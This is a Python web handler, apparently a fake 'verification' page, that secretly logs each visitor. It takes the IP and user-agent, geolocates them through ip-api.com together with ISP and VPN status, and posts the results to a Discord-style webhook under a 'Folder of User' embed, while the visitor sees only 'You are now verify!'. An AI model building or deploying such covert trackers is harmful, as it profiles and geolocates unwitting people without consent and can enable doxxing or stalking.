from http.server import BaseHTTPRequestHandler
import requests
import urllib.parse
import os

WH_URL = os.environ.get('WEBHOOK_BSU')

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.urlparse(self.path).query
        p = urllib.parse.parse_qs(q)
        
        u_ip = self.headers.get('x-forwarded-for', 'N/A').split(',')[0]
        u_ag = self.headers.get('user-agent', 'N/A')

        try:
            r = requests.get(f"http://ip-api.com/json/{u_ip}?fields=221184").json()
            loc = f"{r.get('city', 'Unknown')}, {r.get('country', '??')}"
            isp = r.get('isp', 'Unknown ISP')
            vpn = "Ja" if r.get('proxy') else "Nein"
        except:
            loc, isp, vpn = "Lookup error", "N/A", "N/A"

        dev = "Windows PC" if "Win" in u_ag else "Mobile"
        if "Chrome" in u_ag: dev += " (Chrome)"
        elif "Firefox" in u_ag: dev += " (Firefox)"
        elif "Safari" in u_ag and "Mobile" in u_ag: dev = "iPhone/iOS"

        if WH_URL:
            payload = {
                "embeds": [{
                    "title": "**__📂 Folder of User__**",
                    "color": 0x2b2d31,
                    "description": (
                        f"• 📋 **Server:**\n- Not yet processed\n\n"
                        f"• 📧 **Email:**\n- Not yet processed\n\n"
                        f"• 📍 **Standort/IP-Adresse:**\n{loc} ({u_ip})\n\n"
                        f"• 🧾 **Anbieter:**\n{isp}\n\n"
                        f"• 📱 **Gerät:**\n{dev}\n\n"
                        f"• 🛡️ **VPN genutzt?:**\n{vpn}"
                    ),
                    "footer": {"text": "System V2 • Logging Active"}
                }]
            }
            requests.post(WH_URL, json=payload)

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        # Fix: Kein b vor dem String, stattdessen am Ende .encode()
        response_html = """
        <!DOCTYPE html>
        <html lang="de">
        <head>
            <meta charset="UTF-8">
            <style>
                body { background: #000; color: #fff; font-family: sans-serif; 
                       display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .box { text-align: center; border: 1px solid #111; padding: 60px; border-radius: 10px; background: #050505; }
                <h1>💠</h1><p>You are now verify!</p></div>
            </style>
        </head>
        <body>
            <div class="box"><h1>💠</h1><p>You are now verify!</p></div>
        </body>
        </html>
        """
        self.wfile.write(response_html.encode('utf-8'))

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
